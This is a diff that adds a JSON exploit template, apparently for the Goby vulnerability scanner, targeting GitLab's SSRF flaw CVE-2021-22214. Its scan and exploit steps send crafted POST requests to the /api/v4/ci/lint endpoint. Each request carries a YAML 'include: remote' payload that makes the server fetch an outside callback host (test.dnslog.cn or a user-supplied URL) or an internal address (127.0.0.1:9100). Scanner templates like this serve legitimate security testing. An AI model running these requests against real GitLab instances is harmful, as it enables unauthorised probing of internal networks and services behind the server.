@@ -1,0 +1,147 @@
+{
+      "Name": "GitLab SSRF CVE-2021-22214",
+      "Level": "3",
+      "Tags": [
+            "SSRF"
+      ],
+      "GobyQuery": "app=\"GitLab\"",
+      "Description": "GitLab is The DevOps Platform.",
+      "Product": "GitLab",
+      "Homepage": "https://about.gitlab.com/",
+      "Author": "",
+      "Impact": "When requests to the internal network for webhooks are enabled, a server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab instance where registration is limited.",
+      "Recommendation": "",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-22214",
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-39935",
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-22175",
+            "https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html",
+            "https://docs.gitlab.com/ee/api/lint.html"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "URL",
+                  "Type": "input",
+                  "Value": "test.dnslog.cn"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/api/v4/ci/lint",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json",
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+                        },
+                        "data_type": "text",
+                        "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://test.dnslog.cn/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test.dnslog.cn",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/api/v4/ci/lint?include_merged_yaml=true",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"content\": \"include:\\n  remote: http://127.0.0.1:9100/test.yml\"}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "does not have valid YAML syntax",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/api/v4/ci/lint",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json",
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+                        },
+                        "data_type": "text",
+                        "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://{{{URL}}}/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test.dnslog.cn",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
